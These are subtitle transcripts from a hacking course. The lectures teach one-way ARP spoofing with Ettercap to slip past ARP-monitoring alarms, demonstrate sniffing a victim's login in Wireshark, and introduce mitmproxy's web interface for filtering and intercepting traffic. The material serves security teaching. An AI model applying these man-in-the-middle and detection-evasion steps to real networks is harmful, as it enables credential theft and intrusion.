Router's Mac address.

16
00:00:57,360 --> 00:01:04,420
This will make the victim think that this guy is the router and he will also tell the access point that

17
00:01:04,420 --> 00:01:06,340
I have the victim's Mac address.

18
00:01:06,580 --> 00:01:08,500
This will make the access point.

19
00:01:08,530 --> 00:01:11,980
Thinks that this guy is the victim computer.

20
00:01:12,610 --> 00:01:19,870
So the result of this will be all the traffic, all the requests and responses sent from the victim

21
00:01:19,870 --> 00:01:22,270
will have to pass through the hacker first.

22
00:01:22,330 --> 00:01:25,630
The hacker will forward that request to the access point.

23
00:01:25,660 --> 00:01:31,510
Access point goes to the internet, brings the request, brings it back to the hacker instead of giving

24
00:01:31,510 --> 00:01:32,560
it back to the victim.

25
00:01:32,560 --> 00:01:35,800
And then the hacker will forward that to the victim.

26
00:01:36,220 --> 00:01:41,710
This is basically placing the hacker in the middle of the flow, in the middle of the connection between

27
00:01:41,710 --> 00:01:46,270
the victim and the access point and hence the name man in the middle.

28
00:01:46,300 --> 00:01:51,250
Because we are or the hacker manages to become the man in the middle of the flow.

29
00:01:51,880 --> 00:01:54,550
Now when we're doing this step.

30
00:01:54,550 --> 00:02:02,290
So when we're doing the ARP spoofing step, if the access point implements a way to keep an eye on the

31
00:02:02,290 --> 00:02:09,400
ARP tables, for example, if they're using a solution like ARP Watch or any other solution that depends

32
00:02:09,400 --> 00:02:18,190
on the ARP table to discover ARP spoofing attacks, then it will notice that there are two IP's that

33
00:02:18,190 --> 00:02:26,590
have the same Mac address because in its ARP table the hacker IP and the victim IP will both have the

34
00:02:26,590 --> 00:02:31,930
same Mac address so it will know that something is going wrong.

35
00:02:32,230 --> 00:02:38,650
Some of them will even detect the message when the hacker says I have the victim's Mac address and it'll

36
00:02:38,650 --> 00:02:42,910
raise an alarm or maybe even disconnect the hacker from the network.

37
00:02:43,270 --> 00:02:45,430
So this is not good.

38
00:02:45,430 --> 00:02:52,780
And the only way to bypass this is to use one way spoofing in one way spoofing.

39
00:02:52,810 --> 00:02:59,500
As the name suggests, we only fool the victim that we are the router, so we don't send the router

40
00:02:59,500 --> 00:03:00,180
anything.

41
00:03:00,190 --> 00:03:04,690
We only tell the victim that I have the Router's Mac address.

42
00:03:05,700 --> 00:03:12,180
So what happens is whenever the victim wants to do something on the Internet, it will send that request

43
00:03:12,180 --> 00:03:12,990
to the hacker.

44
00:03:13,020 --> 00:03:15,420
The hacker will forward that to the access point.

45
00:03:15,420 --> 00:03:16,460
So this is fine.

46
00:03:16,470 --> 00:03:23,160
The access point will go to the Internet, get that request, and the response will be sent directly

47
00:03:23,160 --> 00:03:23,940
to the victim.

48
00:03:23,940 --> 00:03:29,070
Because the hacker did not spoof the access point, it only spoofed the victim.

49
00:03:29,430 --> 00:03:36,000
So with this method, anything that the victim requests will go through the hacker, but the responses

50
00:03:36,000 --> 00:03:38,220
will come directly to the victim.

51
00:03:38,490 --> 00:03:44,250
This way the hacker will not be able to see the responses so they won't be able to play around with

52
00:03:44,250 --> 00:03:48,000
the responses, change the code or inject stuff on the browser.

53
00:03:48,000 --> 00:03:54,420
But the hacker will still be able to capture the requests, so they'll still be able to see the URLs.

54
00:03:54,450 --> 00:04:03,030
They'll still be able to see usernames, passwords, run a DNS spoofing attack downgrade https to Http.

55
00:04:03,330 --> 00:04:09,850
The only thing that it won't see and you won't be able to do is play around with the responses because

56
00:04:09,850 --> 00:04:12,400
we don't do anything to the router.

57
00:04:12,400 --> 00:04:18,910
As far as the router is concerned, there is nothing wrong in the network and its sending its responses

58
00:04:18,910 --> 00:04:21,430
to the right place to the victim.

59
00:04:22,120 --> 00:04:28,780
So basically the whole idea of one way spoofing instead of spoofing the access point, we only spoof

60
00:04:28,780 --> 00:04:31,960
the victim and tell it that we are the router.

61
00:04:32,320 --> 00:04:35,280
Now running this in practice is very easy.

62
00:04:35,290 --> 00:04:42,190
So I'm going to go to Kali and I'm going to use the same Ettercap command that we used to use.

63
00:04:42,490 --> 00:04:51,490
The only difference is instead of the ARP remote in here, I'm going to say ARP one way.

64
00:04:52,910 --> 00:04:56,990
To tell Ettercap that I only want to spoof in one way.

65
00:04:57,560 --> 00:05:00,230
Then I'm going to have to modify my targets.

66
00:05:00,230 --> 00:05:07,220
Because when we use the one way argument, it will basically only spoof the flow of packets from Target

67
00:05:07,250 --> 00:05:08,990
one to target two.

68
00:05:09,200 --> 00:05:17,090
So looking at our example here, we want to spoof the flow of packets from victim to the router, not

69
00:05:17,090 --> 00:05:18,980
from the router to the victim.

70
00:05:18,980 --> 00:05:27,260
So first we have to put the IP of the victim, which is ten 2259 and then we put the IP of the router,

71
00:05:27,260 --> 00:05:29,450
which is ten 2251.

72
00:05:30,830 --> 00:05:31,820
And that's it.

73
00:05:32,090 --> 00:05:33,620
So it's very simple.

74
00:05:33,620 --> 00:05:36,380
Let me just go over the command one more time very quickly.

75
00:05:36,380 --> 00:05:42,650
So we're doing Iter cap TC exactly the same as we used to before to run it in quiet mode.

76
00:05:42,680 --> 00:05:50,210
We're doing an ARP spoofing attack and we changed the remote in here and we set that to one way so that

77
00:05:50,210 --> 00:05:57,410
we only spoof the victim and we don't spoof the flow from the gateway to the victim so that we won't

78
00:05:57,440 --> 00:06:00,590
trigger any alarms at the gateway.

79
00:06:00,590 --> 00:06:01,670
If there were any.

80
00:06:02,030 --> 00:06:04,130
Then we're selecting our interface.

81
00:06:04,130 --> 00:06:08,030
We're doing Dash S so that we don't generate SSL certificates.

82
00:06:08,030 --> 00:06:16,970
And then the other very important point is you want to put the victim first, followed by the IP of

83
00:06:16,970 --> 00:06:22,100
the router, because we're only going to be spoofing the flow from Target one to target two.

84
00:06:22,130 --> 00:06:26,930
So we're setting Target one to the victim and we're setting Target two to the router.

85
00:06:27,890 --> 00:06:32,160
I'm going to hit enter and that's running here for me perfectly.

86
00:06:32,280 --> 00:06:35,760
Theoretically, you shouldn't need to do anything else.

87
00:06:35,760 --> 00:06:36,420
That's it.

88
00:06:36,450 --> 00:06:43,200
The requests will be flowing through your computer, so whenever the target person sends URLs, websites,

89
00:06:43,230 --> 00:06:49,020
usernames, passwords, they should be captured here and displayed to you by ettercap.

90
00:06:49,380 --> 00:06:56,910
For some reason when when used with one way spoofing it or caps sniffer seems to miss some usernames

91
00:06:56,910 --> 00:06:57,870
and passwords.

92
00:06:58,110 --> 00:07:04,620
So what I'm going to do is I'm going to run Wireshark and I'll use that to analyze the usernames and

93
00:07:04,620 --> 00:07:05,430
passwords.

94
00:07:06,290 --> 00:07:06,710
Now.

95
00:07:06,710 --> 00:07:08,570
We covered Wireshark before.

96
00:07:09,200 --> 00:07:14,120
So I'm just going to click on Eth0 to start sniffing on that interface.

97
00:07:15,710 --> 00:07:19,130
And I'm going to set the filter here to Http.

98
00:07:19,880 --> 00:07:22,400
So we only see Http packets.

99
00:07:23,030 --> 00:07:27,470
Now let's go to the target computer and log in to some service.

100
00:07:28,460 --> 00:07:30,410
So I'm going to go to Bing.com.

101
00:07:32,160 --> 00:07:34,170
Look for a dictionary.

102
00:07:36,150 --> 00:07:37,410
Login.

103
00:07:40,930 --> 00:07:42,730
And log in.

104
00:07:43,420 --> 00:07:51,040
I'm going to put the username as zaid@security.org and set the password to 123456.

105
00:07:51,070 --> 00:07:52,390
Hit enter.

106
00:07:52,720 --> 00:07:56,350
And let's go back to Carly, see if that's being captured.

107
00:07:57,190 --> 00:08:00,280
Now we can see in Wireshark everything is being logged in here.

108
00:08:00,280 --> 00:08:03,010
But let me just show you in Ettercap.

109
00:08:03,730 --> 00:08:08,230
You'll see that Ettercap did not manage to get the username and password.

110
00:08:08,320 --> 00:08:12,520
And this only happens when you're using one way sniffing or one way spoofing.

111
00:08:12,550 --> 00:08:18,640
That's why I started Wireshark here on the side so we can get the username and password in here.

112
00:08:19,240 --> 00:08:23,020
So I'm going to stop the sniffing and we're going to look.

113
00:08:23,020 --> 00:08:30,010
I'm already filtering based on Http flows and we want to look for a post request, so I'm going to scroll

114
00:08:30,010 --> 00:08:30,640
down.

115
00:08:31,520 --> 00:08:34,130
And we have a post request in here.

116
00:08:34,520 --> 00:08:38,660
I'm going to click that, go on the HTML form.

117
00:08:39,140 --> 00:08:45,620
And as you can see, we captured the login host, the username and the password.

118
00:08:45,830 --> 00:08:52,370
So by now you already know how to use Wireshark and you already know how to use Ettercap.

119
00:08:52,550 --> 00:08:59,180
So the main point that I wanted to highlight in this lecture is the one way spoofing feature of Ettercap

120
00:08:59,210 --> 00:09:06,320
as it can be used to bypass filters that might be raising alarms on networks using this feature.

121
00:09:06,320 --> 00:09:13,910
If we only poison our victim without poisoning the router will be able to bypass these type of filters

122
00:09:13,910 --> 00:09:16,310
if they are implemented on the router.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 10: Post Connection Attacks - Analysing Data Flows & Running Custom Attacks

1
00:00:00,520 --> 00:00:07,930
Previously I showed you how to inject JavaScript code in pages loaded by the target user using man in

2
00:00:07,930 --> 00:00:08,890
the middle F.

3
00:00:09,310 --> 00:00:16,180
So man in the middle F was doing all the hard work for us and that method would only work to inject

4
00:00:16,390 --> 00:00:21,100
HTML or JavaScript code in the page that the target person is loading.

5
00:00:21,580 --> 00:00:25,330
But what if you want to replace a piece of the HTML code?

6
00:00:25,360 --> 00:00:31,960
What if you want to replace a PDF or x URLs with a URL with an evil file?

7
00:00:32,080 --> 00:00:34,160
What if you want to replace downloads?

8
00:00:34,180 --> 00:00:37,180
What if man in the middle f just didn't work?

9
00:00:37,510 --> 00:00:44,230
So in this lecture and the next few lectures, I want to show you a manual and generic method to analyze

10
00:00:44,230 --> 00:00:45,940
and modify packets.

11
00:00:46,210 --> 00:00:51,310
I'm going to walk you through all the steps, and by the end of it you'll be able to do all of the attacks

12
00:00:51,310 --> 00:00:52,620
that I said earlier.

13
00:00:52,630 --> 00:00:57,340
Plus you'll be able to adapt this method to do any attack that you can think of.

14
00:00:57,370 --> 00:01:02,120
As long as that attack involves reading and modifying packet flows.

15
00:01:02,510 --> 00:01:08,330
Now to analyze and modify packets, we're going to use a tool called Man in the Middle Proxy.

16
00:01:08,840 --> 00:01:16,100
So this is a proxy just like SSL strip, but SSL strip was automatically programmed to downgrade Https

17
00:01:16,100 --> 00:01:19,490
connections to Http man in the middle.

18
00:01:19,490 --> 00:01:21,170
Proxy doesn't do anything.

19
00:01:21,170 --> 00:01:24,200
It gives you the freedom to do whatever you want.

20
00:01:24,500 --> 00:01:27,890
So it's going to become more clear once we actually start using it.

21
00:01:27,890 --> 00:01:33,860
But let me first show you how to install it and set it up and then we'll talk about analyzing and modifying

22
00:01:33,860 --> 00:01:34,880
packets later.

23
00:01:35,330 --> 00:01:41,930
So I'm going to include the download link in the resources, but I already have it loaded here, so

24
00:01:41,930 --> 00:01:45,080
all I'm going to do is just download the Linux version right here.

25
00:01:45,980 --> 00:01:47,600
I'm going to click on Save file.

26
00:01:51,030 --> 00:01:51,990
And that's it.

27
00:01:51,990 --> 00:01:53,050
Download it for me.

28
00:01:53,070 --> 00:01:54,660
Now this is an archive.

29
00:01:54,690 --> 00:01:56,970
You can just click it one click in here.

30
00:01:57,000 --> 00:01:59,010
It will open all the contents.

31
00:01:59,220 --> 00:02:03,010
Now I'm going to hit Control A to select all the files.

32
00:02:03,030 --> 00:02:07,200
I'm going to go on extract to uncompressed this archive.

33
00:02:08,190 --> 00:02:15,600
And I want to put it in opt because that's the location where you're supposed to put your optional applications.

34
00:02:16,080 --> 00:02:20,010
So I'm going to go to the base and then I'm going to go to opt.

35
00:02:21,290 --> 00:02:22,820
I'm going to make a new directory.

36
00:02:22,850 --> 00:02:26,120
First in here by clicking on this plus in here.

37
00:02:26,120 --> 00:02:28,640
And I'm going to call it Man in the Middle Proxy.

38
00:02:30,470 --> 00:02:31,340
Inside it.

39
00:02:31,340 --> 00:02:33,410
We're going to save our files.

40
00:02:33,410 --> 00:02:38,030
And I'm just going to click on Extract to decompress all the files.

41
00:02:39,070 --> 00:02:44,890
If we click on show files, you'll see we have an opt man in the middle proxy.

42
00:02:44,920 --> 00:02:47,830
We have the three main files for the program.

43
00:02:48,910 --> 00:02:54,400
So the man in the middle dump is the command line version of Man in the Middle Proxy.

44
00:02:54,400 --> 00:02:59,620
So you can literally just give it one command and it will follow the command that you give it and we'll

45
00:02:59,620 --> 00:03:01,030
be using it in the future.

46
00:03:01,510 --> 00:03:05,170
Man in the middle proxy, you can think of it as the main tool.

47
00:03:05,410 --> 00:03:12,880
It runs as an interactive command line similar to Ettercap, and it allows you to intercept, analyze

48
00:03:12,880 --> 00:03:14,380
and edit packets.

49
00:03:15,300 --> 00:03:19,890
Man in the Middle Web is a web interface similar to man in the middle proxy.

50
00:03:19,890 --> 00:03:20,220
So.

51
00:03:20,250 --> 00:03:23,310
Man in the middle proxy runs through the command line.

52
00:03:23,310 --> 00:03:24,690
Whereas Man in the Middle web.

53
00:03:24,720 --> 00:03:26,550
Shows a nice web interface.

54
00:03:26,550 --> 00:03:31,000
And it's actually very nice when you all you want is just analyze the packets flowing.

55
00:03:31,020 --> 00:03:36,780
You can also use it to modify packets, but I think it's really, really handy to analyze smaller pieces

56
00:03:36,780 --> 00:03:38,070
of data flows.

57
00:03:38,610 --> 00:03:40,230
Now, don't worry about all of that.

58
00:03:40,230 --> 00:03:45,330
We'll be talking about all of these tools later on and we'll be using them so you'll understand why

59
00:03:45,330 --> 00:03:47,040
we use each one of these.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1
00:00:00,970 --> 00:00:08,470
Now let's say you have an idea of an attack and you want that attack to be executed when a user loads

2
00:00:08,470 --> 00:00:09,490
a web page.

3
00:00:10,030 --> 00:00:17,890
Before you can run this attack, you need to analyze and learn what happens when a user loads that web

4
00:00:17,890 --> 00:00:18,340
page.

5
00:00:18,340 --> 00:00:24,190
So different things might be loading when a user loads a different web page or when they load a different

6
00:00:24,190 --> 00:00:24,930
service.

7
00:00:24,940 --> 00:00:31,720
So in this lecture I want to show you how to analyze packet flows so that you can see what's happening

8
00:00:31,720 --> 00:00:37,330
when a user access a service or loads a web page and then build your attack from there.

9
00:00:37,570 --> 00:00:41,200
To do this, we're going to use Man in the middle proxy web.

10
00:00:41,200 --> 00:00:47,170
And first we have to go to where we extracted it and that was an opt.

11
00:00:47,170 --> 00:00:48,730
So I'm going to do CD opt.

12
00:00:54,260 --> 00:00:57,980
And that is an opt man in the middle proxy.

13
00:00:59,700 --> 00:01:06,690
Now, if we do, LZ, you can see we have the three tools, the man in the middle dump proxy and web.

14
00:01:07,350 --> 00:01:12,510
The one that's best for analyzing data, in my opinion, is Man in the Middle Web.

15
00:01:12,540 --> 00:01:17,910
So to run it, we're just going to do for dot forward slash Man in the Middle web.

16
00:01:19,410 --> 00:01:20,640
I'm going to hit Enter.

17
00:01:21,690 --> 00:01:25,860
And that'll give me two URLs, as you can see here.

18
00:01:26,280 --> 00:01:28,650
The first one is for the proxy.

19
00:01:28,650 --> 00:01:31,920
So this is the address where the proxy is running.

20
00:01:31,920 --> 00:01:38,940
This is the software that intercepts packets and allows us to modify them and do all the cool stuff.

21
00:01:39,600 --> 00:01:42,000
And then we have the web interface.

22
00:01:42,000 --> 00:01:47,010
So this is just a graphical interface that allows us to use the web proxy.

23
00:01:47,250 --> 00:01:54,480
And this is running on 1270018 81 so we can just copy this.

24
00:01:56,340 --> 00:01:58,560
And open it in here in my browser.

25
00:02:02,240 --> 00:02:08,930
And as you can see, we have a simple web interface where we can see the packets in here and then filter

26
00:02:08,930 --> 00:02:10,550
them or intercept them.

27
00:02:11,180 --> 00:02:15,290
Now, right now, there is no packets because there is no traffic.

28
00:02:16,910 --> 00:02:20,360
So Man in the Middle proxy supports two modes.

29
00:02:20,840 --> 00:02:24,680
It supports explicit and transparent mode.

30
00:02:25,190 --> 00:02:30,260
In the explicit mode, the user connects directly to the proxy.

31
00:02:30,710 --> 00:02:36,260
So it's useful when when you're running it against your own machine, when you want to just analyze

32
00:02:36,260 --> 00:02:42,380
data and try to build up your attack because you can't actually attack someone that way unless you social

33
00:02:42,380 --> 00:02:43,340
engineer them.

34
00:02:44,000 --> 00:02:50,600
The transparent method is where you redirect the flow of packets to the proxy and we'll talk about that

35
00:02:50,600 --> 00:02:53,990
later on when we do it with an ARP spoofing attack.

36
00:02:54,200 --> 00:02:58,850
But right now, all we want to do is just read the data and analyze it.

37
00:02:59,390 --> 00:03:03,350
So we're going to be using the default mode, which is explicit.

38
00:03:04,340 --> 00:03:10,670
So because we run man in the middle proxy without giving any options, it will run on the explicit mode

39
00:03:10,670 --> 00:03:11,750
by default.

40
00:03:12,470 --> 00:03:19,130
So because it's on the explicit mode, we have to configure our browser to connect to that proxy and

41
00:03:19,130 --> 00:03:20,600
send data to it.

42
00:03:21,170 --> 00:03:25,040
To do that, we're going to go on the menu here.

43
00:03:25,430 --> 00:03:27,500
I'm going to go on preferences.

44
00:03:29,250 --> 00:03:30,210
Advanced.

45
00:03:31,570 --> 00:03:34,300
Network and settings.

46
00:03:36,210 --> 00:03:39,720
And here we're going to say we want to use a manual proxy.

47
00:03:40,380 --> 00:03:46,620
The address is going to be my local host because my proxy is running on this computer.

48
00:03:47,040 --> 00:03:49,650
So it's going to be 127001.

49
00:03:53,380 --> 00:03:56,710
The port is the port where the proxy is running.

50
00:03:56,710 --> 00:04:02,380
And as you can see in here, it's telling us that the proxy is running at port 8080.

51
00:04:04,730 --> 00:04:06,160
So I'll set that to 80.

52
00:04:06,190 --> 00:04:06,720
80.

53
00:04:10,030 --> 00:04:11,410
And that's it, we're done.

54
00:04:11,410 --> 00:04:17,800
So we set the proxy to our local host because Man in the Middle proxy is running on my local host and

55
00:04:17,800 --> 00:04:22,390
we set the port to 8080 because the that's the part that was given to us in here.

56
00:04:23,260 --> 00:04:24,460
So I'm going to click on.

57
00:04:24,460 --> 00:04:25,150
Okay.

58
00:04:26,630 --> 00:04:27,890
And what happens now?

59
00:04:27,890 --> 00:04:34,850
Every time I try to do anything on my browser here in Firefox, the data is going to go first to man

60
00:04:34,850 --> 00:04:38,990
in the middle proxy and then it'll go to the Internet.

61
00:04:39,020 --> 00:04:44,810
When it comes back, it's going to go through man in the middle proxy first and then comes back to me

62
00:04:44,810 --> 00:04:50,720
to the browser because we manually configure the browser to use man in the middle proxy as a proxy.

63
00:04:50,720 --> 00:04:57,020
So we're literally telling the browser, I trust this proxy and I want you to redirect the packets or

64
00:04:57,020 --> 00:04:59,450
the flow of data through this proxy.

65
00:05:00,140 --> 00:05:06,110
Now I'm doing this again just so that I can analyze what happens when people access the services or

66
00:05:06,110 --> 00:05:08,120
the pages that I want to target.

67
00:05:08,150 --> 00:05:14,600
Once I build up my attack, I'll teach you how to run this attack against a different computer using

68
00:05:14,600 --> 00:05:16,280
an ARP spoofing attack.

69
00:05:17,300 --> 00:05:20,690
So right now we'll go back to man in the middle proxy.

70
00:05:20,690 --> 00:05:22,790
And as you can see, there is nothing here.

71
00:05:22,790 --> 00:05:23,570
It's still empty.

72
00:05:23,600 --> 00:05:24,580
No data.

73
00:05:24,590 --> 00:05:27,080
But I'm going to open a new page, actually.

74
00:05:28,460 --> 00:05:30,110
And make this smaller.

75
00:05:34,550 --> 00:05:36,530
And let's go to Bing.com.

76
00:05:39,450 --> 00:05:41,100
Now once I hit enter.

77
00:05:42,190 --> 00:05:45,550
You can see all the packets are flowing through here.

78
00:05:46,390 --> 00:05:53,620
So now anything that I do on my browser, whether I access a web page, I load a song, a video, I

79
00:05:53,620 --> 00:05:55,540
use a service, I play a game.

80
00:05:55,540 --> 00:06:01,900
Anything that I do on this web server will be redirected to flow through man in the middle proxy, which

81
00:06:01,900 --> 00:06:05,290
will display it for me in here in this nice interface.

82
00:06:05,470 --> 00:06:10,900
So we can use this to analyze and see what happens when our target does something.

83
00:06:10,900 --> 00:06:16,780
And then from there we can see what we can modify and then build our attack strategy.

84
00:06:17,440 --> 00:06:21,940
Now I'm going to talk about this in more details in the next lectures, and we'll see how we can filter

85
00:06:21,940 --> 00:06:25,120
and intercept stuff and read all of these requests.

86
00:06:25,120 --> 00:06:27,310
So don't be intimidated by that.

87
00:06:27,610 --> 00:06:34,570
But for now, I just wanted to show you how to install and use Man in the Middle proxy as an explicit

88
00:06:34,570 --> 00:06:42,200
proxy on our own computer so that we can analyze what happens when people visit pages or access services.

89
00:06:43,450 --> 00:06:48,460
Now, once done with using the tool, make sure you go back to your preferences.

90
00:06:48,490 --> 00:06:51,490
Go to the same place Advanced Network.

91
00:06:51,520 --> 00:06:58,180
Then go to settings and make sure you go back to no proxy because if you don't do this and you turn

92
00:06:58,180 --> 00:07:03,940
off the tool, you'll lose your internet connection in Firefox because Firefox will try to redirect

93
00:07:03,940 --> 00:07:06,730
the data to a proxy that is not running.

94
00:07:06,850 --> 00:07:08,480
So make sure you do this.

95
00:07:08,500 --> 00:07:11,830
Once you're done with using man in the middle proxy.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,690 --> 00:00:01,110
Okay.

2
00:00:01,110 --> 00:00:07,210
In this lecture, I'd like to show you how to analyze the data that we see in Man in the Middle proxy.

3
00:00:07,230 --> 00:00:12,900
So right now, I've already configured my browser to redirect data through Man in the Middle proxy,

4
00:00:12,900 --> 00:00:16,380
like I showed you before, and I've already accessed Bing.com.

5
00:00:16,380 --> 00:00:22,320
And as you can see, I have all the requests and responses that were sent to and from the target when

6
00:00:22,320 --> 00:00:23,940
they accessed Bing.com.

7
00:00:24,930 --> 00:00:32,100
So these are the data sent whenever someone tries to go to a website so you can see the first thing

8
00:00:32,100 --> 00:00:38,940
that happens here is the person requested to go to Bing.com and then they made and got all of these

9
00:00:38,940 --> 00:00:40,320
responses in here.

10
00:00:40,890 --> 00:00:43,200
Now, don't be intimidated by this.

11
00:00:43,230 --> 00:00:45,630
We'll be talking about this more in the future.

12
00:00:45,630 --> 00:00:50,970
And I'm going to show you how to analyze this more and use it to build up your own attacks.

13
00:00:51,600 --> 00:00:57,540
So if we click in here, for example, on this first packet or this first flow, you can see that this

14
00:00:57,540 --> 00:01:00,240
was a get request for bing.com.

15
00:01:00,420 --> 00:01:04,290
You can see the header, the user agent and all that information.

16
00:01:05,190 --> 00:01:12,780
If we click on the response tab, you'll see the response that the user got when they requested Bing.com.

17
00:01:12,780 --> 00:01:18,960
And you can see in here, this is the HTML code that the user got when they requested that page.

18
00:01:19,230 --> 00:01:20,970
So this is very cool.

19
00:01:21,120 --> 00:01:27,580
Now, when we clicked on this, we automatically went into the flow tab and I'll talk about that later

20
00:01:27,580 --> 00:01:28,060
on.

21
00:01:28,060 --> 00:01:30,370
So if we go back to the start tab.

22
00:01:31,290 --> 00:01:35,190
You'll see we have three main input boxes.

23
00:01:35,700 --> 00:01:41,220
Now, the first two are very similar, which can be used to search or highlight packets.

24
00:01:42,000 --> 00:01:47,310
The third one can be used to intercept packets and I'll talk about that later on.

25
00:01:47,940 --> 00:01:51,210
So right now, let me show you the search function.

26
00:01:51,210 --> 00:01:58,620
And as you can see, as soon as I click in the search box, you'll see all the search regex that I can

27
00:01:58,620 --> 00:02:00,150
use to filter data.

28
00:02:00,660 --> 00:02:02,610
Now, I'm going to keep this simple.

29
00:02:02,610 --> 00:02:06,310
And for example, let's say I'm looking for page assets.

30
00:02:06,330 --> 00:02:11,370
You can see the first one here is a and this allows us to match assets.

31
00:02:11,370 --> 00:02:15,600
So it's stuff like CSS, JavaScript, flash and images.

32
00:02:16,320 --> 00:02:24,360
So basically as soon as I put this character, followed by the letter A, you'll see I'll only see the

33
00:02:24,360 --> 00:02:25,740
assets loaded in the page.

34
00:02:25,740 --> 00:02:29,090
So we don't see anything else, any other type of requests.

35
00:02:29,100 --> 00:02:36,100
All we see is just a JavaScript, a JavaScript and an image that were loaded in that page.

36
00:02:36,790 --> 00:02:41,830
Now looking at this image in here, you can actually download it if you click on this.

37
00:02:43,690 --> 00:02:47,170
So we're just going to do open width to see the image that was loaded.

38
00:02:47,770 --> 00:02:53,710
And as you can see in here, it's just an image of an X that's probably used somewhere within the page.

39
00:02:54,670 --> 00:02:59,650
Now, this search box is very powerful because you can use it to filter anything.

40
00:02:59,680 --> 00:03:03,760
For example, we put the A and it filtered all the assets.

41
00:03:03,760 --> 00:03:05,710
So it filtered JavaScript images.

42
00:03:05,710 --> 00:03:10,660
And if there was a flash or CSS files, then it will filter it for us as well.

43
00:03:11,110 --> 00:03:14,050
Now let's say I'm only interested in JavaScript.

44
00:03:14,050 --> 00:03:16,930
After that I'm going to put Dot JS.

45
00:03:17,440 --> 00:03:20,650
And as you can see now, I only have JavaScript files.

46
00:03:20,740 --> 00:03:24,610
So this can be very, very handy when the data flow gets bigger.

47
00:03:26,110 --> 00:03:27,760
Now deleting everything.

48
00:03:27,790 --> 00:03:36,130
Another example of a filter is the M, So if we put the same character followed by M, this will allow

49
00:03:36,130 --> 00:03:40,600
us to filter based on the method so we can do for example, post.

50
00:03:42,770 --> 00:03:48,320
And this will only show me post requests, as you can see, deleting this.

51
00:03:48,320 --> 00:03:55,010
And if I put get again, as you can see, it only shows me the get requests.

52
00:03:56,640 --> 00:03:58,350
Now, don't worry about this list.

53
00:03:58,380 --> 00:04:00,150
We'll be using it more often.

54
00:04:00,150 --> 00:04:06,420
And you can also just spend some of your own time experimenting with what each one of these entries

55
00:04:06,420 --> 00:04:07,740
allow you to filter.

56
00:04:09,480 --> 00:04:11,750
Now going on to the highlight.

57
00:04:11,760 --> 00:04:13,740
It's very similar to the search.

58
00:04:13,770 --> 00:04:20,130
The only difference is when we use the search, it filters this information and it only show us the

59
00:04:20,310 --> 00:04:24,480
the stuff that we're looking for, the stuff that we put in the search box.

60
00:04:25,160 --> 00:04:29,780
And the highlight, as the name suggests, it will only highlight it for us.

61
00:04:29,810 --> 00:04:36,380
For example, if I look for the assets like we did, it will only just put a yellow mark over the asset

62
00:04:36,380 --> 00:04:44,120
files so it won't just search for them the same way that we see in when we use it in the search box.

63
00:04:45,030 --> 00:04:47,140
So that's it for this lecture.

64
00:04:47,160 --> 00:04:50,160
Like I said, there is a bit of information in here.

65
00:04:50,160 --> 00:04:53,170
There is a lot of data that's being displayed in here.

66
00:04:53,190 --> 00:04:55,320
Don't get too intimidated by it.

67
00:04:55,320 --> 00:05:01,470
Feel free to spend some of your own time to experiment with all the regex that you can use and experiment

68
00:05:01,470 --> 00:05:04,350
with different data flows and see how you can filter it.

69
00:05:04,380 --> 00:05:06,980
In the next lectures we'll be filtering more stuff.

70
00:05:06,990 --> 00:05:12,690
We'll be using this a lot and it will just become more clear to you as we go through the course.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,900 --> 00:00:01,590
Okay.

2
00:00:01,590 --> 00:00:08,040
In this lecture, I'd like to show you how to intercept and edit packets using Man in the middle proxy.

3
00:00:08,550 --> 00:00:14,880
So in the previous lecture we seen how to use the search and the highlight features to filter packets

4
00:00:14,880 --> 00:00:18,900
or highlight them based on regex and based on what we're looking for.

5
00:00:19,680 --> 00:00:25,860
In this lecture we're going to be using the intercept bar right here to intercept packets and stop them

6
00:00:25,860 --> 00:00:30,360
from going to the target person or from going to their destination.

7
00:00:30,390 --> 00:00:35,670
Then when we intercept them, we'll be able to modify them and do whatever we want with it.

8
00:00:36,330 --> 00:00:40,170
So right now, I've already started My Man in the Middle Web proxy.

9
00:00:40,200 --> 00:00:42,420
It's already running in here, as you can see.

10
00:00:42,420 --> 00:00:47,790
And I've already configured my browser, as I showed you before, to use Man in the Middle proxy as

11
00:00:47,790 --> 00:00:48,570
a proxy.

12
00:00:48,570 --> 00:00:53,550
So anything I do on the browser now is going to flow through man in the middle proxy and then I'll be

13
00:00:53,580 --> 00:00:58,140
able to see it here, filter it, intercept it or do whatever I want with it.

14
00:00:59,100 --> 00:01:04,950
Now, as you can see, as soon as we click into the intercept, you can see a list of all the regex

15
00:01:04,950 --> 00:01:10,510
that you can use to tell man in the middle proxy which packets to intercept.

16
00:01:10,530 --> 00:01:16,710
So it's exactly the same regex or rules that you can use with the search and the highlight.

17
00:01:16,740 --> 00:01:23,640
You can use them in here in the intercept and man in the middle proxy will only intercept the packets

18
00:01:23,640 --> 00:01:28,410
that you tell it to intercept that will match the rule that you put in this box.

19
00:01:29,410 --> 00:01:31,450
Now, let me give you a quick example.

20
00:01:31,450 --> 00:01:35,080
First, let me just go to Bing.com without intercepting anything.

21
00:01:35,080 --> 00:01:37,960
So I'm just going to go to Bing.com here.

22
00:01:39,040 --> 00:01:41,260
And you'll see all the packets coming through.

23
00:01:42,180 --> 00:01:46,320
Now let's try to intercept post requests.

24
00:01:46,620 --> 00:01:53,010
So like we seen in the previous lecture, if we put Tilde M followed by post.

25
00:01:54,450 --> 00:01:58,920
This would filter the post requests for us if we put it in the search.

26
00:01:59,100 --> 00:02:04,320
If we put it in the intercept here, it's going to intercept post requests.

27
00:02:04,770 --> 00:02:11,190
So if you look at the bottom here, you'll also see that there is a tag added and that says that intercept

28
00:02:11,190 --> 00:02:12,450
filter is enabled.

29
00:02:12,450 --> 00:02:15,060
And the rule that we're using is post.

30
00:02:15,060 --> 00:02:17,850
So we're trying to intercept post requests.

31
00:02:18,600 --> 00:02:22,140
Now let's go here on Bing and just search for something.

32
00:02:22,140 --> 00:02:24,000
So let's just search for test.

33
00:02:28,110 --> 00:02:31,410
Now, as you can see, everything was allowed to flow.

34
00:02:31,410 --> 00:02:33,510
But the post requests.

35
00:02:33,510 --> 00:02:38,340
So you can see every time there is a post request it's being posed in here, you can see that there

36
00:02:38,340 --> 00:02:39,240
is a pose on it.

37
00:02:39,240 --> 00:02:42,870
It's written in orange and if we click on it.

38
00:02:44,410 --> 00:02:48,100
You'll see all the information that is being posted.

39
